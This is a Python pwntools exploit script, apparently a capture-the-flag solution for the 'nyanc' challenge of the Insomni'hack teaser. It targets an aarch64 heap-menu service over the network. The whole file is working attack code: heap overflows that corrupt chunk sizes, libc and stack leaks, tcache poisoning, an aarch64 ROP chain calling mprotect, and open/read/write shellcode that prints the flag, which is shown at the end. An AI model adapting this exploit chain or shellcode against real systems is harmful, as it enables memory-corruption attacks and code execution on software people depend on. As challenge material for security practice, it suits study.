from pwn import *

context.arch = "aarch64"

#r = process("./nyanc", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("nyanc.teaser.insomnihack.ch", 1337)

r.recvuntil(">")

def alloc(length, data, siceme=False):
    r.sendline("1")
    r.recvuntil("len : ")
    r.sendline(str(length))
    if length != 0:
        r.recvuntil("data : ")
        r.send(data)
    if not siceme:
        r.recvuntil(">")

def view(index):
    r.sendline("2")
    r.recvuntil("index : ")
    r.sendline(str(index))
    sice = r.recvuntil("====== menu ======").strip("====== menu ======")
    r.recvuntil(">")
    return sice

def edit(index, newdata):
    r.sendline("3")
    r.recvuntil("index : ")
    r.sendline(str(index))
    r.recvuntil("data : ")
    r.send(newdata)
    r.recvuntil(">")

def delete(index):
    r.sendline("4")
    r.recvuntil("index : ")
    r.sendline(str(index))
    r.recvuntil(">")


alloc(0, "") #0
edit(0, "A"*24 + p64(0xd91) + "\x00"*50)
alloc(0x1000, "B"*0x1000) #1
alloc(0, "A")#2
alloc(0xd30, "B")#3

leak = u64(view(2).split("data: ")[1].ljust(8, "\x00"))
print hex(leak)
libcbase = leak - 0x1540d0
print "libcbase: " + hex(libcbase)

delete(0)
delete(1)
delete(2)
delete(3)

mallochook = 0x154318
environ = 0x155cc8

alloc(0xf00, "B") #0
alloc(0, "") #1
edit(1, "A"*24 + p64(0xc1) + "\x00"*200)
alloc(0x200, "C") #2
alloc(0xd88, "D") #3 next stage overflower
# use 1 to overwrite tcache chunk fd pointer
alloc(0, "D") #4
edit(4, "A"*24 + p64(0x41) + "\x00"*200)
alloc(0x200, "E") #5
edit(4, "A"*24 + p64(0x21) + p64(libcbase + environ))
alloc(10, "AAAA") #6
alloc(0, "") #7

leak = u64(view(7).split("data: ")[1].ljust(8, "\x00"))
print "stack: " + hex(leak)

edit(1, "A"*24 + p64(0xa1) + p64(leak - 0x170 - 0x8))
delete(6)
delete(7)
alloc(0x98, "A") #6

gadget = libcbase + 0x00062554
#mov x0, [x29 + 0x18]
#mov x29, [sp]
#mov x30, [sp+8]
#add sp, 0x20
print "WRITETO: " + hex(leak - 0x138)
alloc(0x98, p64(leak - 0x170) + p64(gadget) + p64(0x0) + p64(0x0) + p64(leak - 0x138) + p64(libcbase + 0x635d8 + 0x8), siceme=True)# + p64(0x10) + "C"*8 + "D"*8 + "E"*8) #7



gadget1 = libcbase + 0x0000000000062554
gadget3 = libcbase + 0x000000000006dd6c
gadget4 = libcbase + 0x0000000000026dc4
gadget5 = libcbase + 0x000000000003f8c8
gadget7 = libcbase + 0x00000000000ed2f8
gadget11 = libcbase + 0x000000000004663c
gadget14 = libcbase + 0x00000000000853f4
mprotect = libcbase + 0xccaf0

loc1 = leak - 0x128
loc2 = leak - 0x20000
loc2 = loc2 - (loc2 & 0xfff)
print "mprotectloc: " + hex(loc2)
payload = "A"*8 + p64(gadget5) + p64(0x21000) + "flag\x00\x00\x00\x00" + "A"*16
#payload += "A"*8 + p64(gadget4) + p64(gadget5) + p64(gadget11) + p64(0x7) + "A"*8 + "A"*8 + "A"*8

payload += p64(loc1-0x18) + p64(gadget1) + p64(gadget7) + p64(gadget3) + "A"*8 + "A"*8 + "A"*8 + "A"*8
payload += "A"*8 + p64(gadget4) + "A"*8 + "A"*8
payload += "A"*8 + p64(gadget5) + "A"*8 + "A"*8 + "A"*8 + "A"*8

payload += "A"*8 + p64(gadget4) + p64(gadget5) + p64(gadget11) + p64(0x7) + "A"*8 + "A"*8 + "A"*8

payload += "A"*8 + p64(gadget14) + "A"*8 + p64(gadget3) + "A"*8 + p64(mprotect) + p64(loc2) + "A"*8
payload += "A"*8 + p64(leak + 0x38) + "A"*8 + "A"*8 + "A"*8 + "A"*8

shellchode = """mov x1, 0
movz x0, {flagaddr1}
movk x0, {flagaddr2}, lsl 16
movk x0, {flagaddr3}, lsl 32
movk x0, {flagaddr4}, lsl 48
mov x2, 0

movz x3, {openaddr1}
movk x3, {openaddr2}, lsl 16
movk x3, {openaddr3}, lsl 32
movk x3, {openaddr4}, lsl 48
blr x3
movz x1, {stackaddr1}
movk x1, {stackaddr2}, lsl 16
movk x1, {stackaddr3}, lsl 32
movk x1, {stackaddr4}, lsl 48
mov x2, 100
movz x3, {readaddr1}
movk x3, {readaddr2}, lsl 16
movk x3, {readaddr3}, lsl 32
movk x3, {readaddr4}, lsl 48
blr x3
mov x0, 1
movz x1, {stackaddr1fuck}
movk x1, {stackaddr2fuck}, lsl 16
movk x1, {stackaddr3fuck}, lsl 32
movk x1, {stackaddr4fuck}, lsl 48
mov x2, 100
movz x3, {writeaddr1}
movk x3, {writeaddr2}, lsl 16
movk x3, {writeaddr3}, lsl 32
movk x3, {writeaddr4}, lsl 48
blr x3"""



flagaddr = loc1 + 0x8
openaddr = libcbase + 0xc25e8
stackaddr = leak - 0x300
readaddr = libcbase + 0xc2a78
writeaddr = libcbase + 0xc2b80
stackaddrfuck = leak - 0x300

flagaddr1 = hex(flagaddr & 0xffff)
flagaddr2 = hex(flagaddr >> 16 & 0xffff)
flagaddr3 = hex(flagaddr >> 32 & 0xffff)
flagaddr4 = hex(flagaddr >> 48 & 0xffff)


openaddr1 = hex(openaddr & 0xffff)
openaddr2 = hex(openaddr >> 16 & 0xffff)
openaddr3 = hex(openaddr >> 32 & 0xffff)
openaddr4 = hex(openaddr >> 48 & 0xffff)


stackaddr1 = hex(stackaddr & 0xffff)
stackaddr2 = hex(stackaddr >> 16 & 0xffff)
stackaddr3 = hex(stackaddr >> 32 & 0xffff)
stackaddr4 = hex(stackaddr >> 48 & 0xffff)

readaddr1 = hex(readaddr & 0xffff)
readaddr2 = hex(readaddr >> 16 & 0xffff)
readaddr3 = hex(readaddr >> 32 & 0xffff)
readaddr4 = hex(readaddr >> 48 & 0xffff)

writeaddr1 = hex(writeaddr & 0xffff)
writeaddr2 = hex(writeaddr >> 16 & 0xffff)
writeaddr3 = hex(writeaddr >> 32 & 0xffff)
writeaddr4 = hex(writeaddr >> 48 & 0xffff)

stackaddr1fuck = hex(stackaddrfuck & 0xffff)
stackaddr2fuck = hex(stackaddrfuck >> 16 & 0xffff)
stackaddr3fuck = hex(stackaddrfuck >> 32 & 0xffff)
stackaddr4fuck = hex(stackaddrfuck >> 48 & 0xffff)


pause()

shellchode = shellchode.format(stackaddr1fuck=stackaddr1fuck, stackaddr2fuck=stackaddr2fuck, stackaddr3fuck=stackaddr3fuck, stackaddr4fuck=stackaddr4fuck, flagaddr1=flagaddr1, flagaddr2=flagaddr2, flagaddr3=flagaddr3, flagaddr4=flagaddr4, openaddr1=openaddr1, openaddr2=openaddr2, openaddr3=openaddr3, openaddr4=openaddr4, stackaddr1=stackaddr1, stackaddr2=stackaddr2, stackaddr3=stackaddr3, stackaddr4=stackaddr4, readaddr1=readaddr1, readaddr2=readaddr2, readaddr3=readaddr3, readaddr4=readaddr4, writeaddr1=writeaddr1, writeaddr2=writeaddr2, writeaddr3=writeaddr3, writeaddr4=writeaddr4)

shellcode = asm(shellchode)

print len(shellcode)

payload += shellcode
r.sendline(payload)

r.interactive()

# Flag: INS{use_chroot_to_make_ropchains_great_again!!!_72df4}
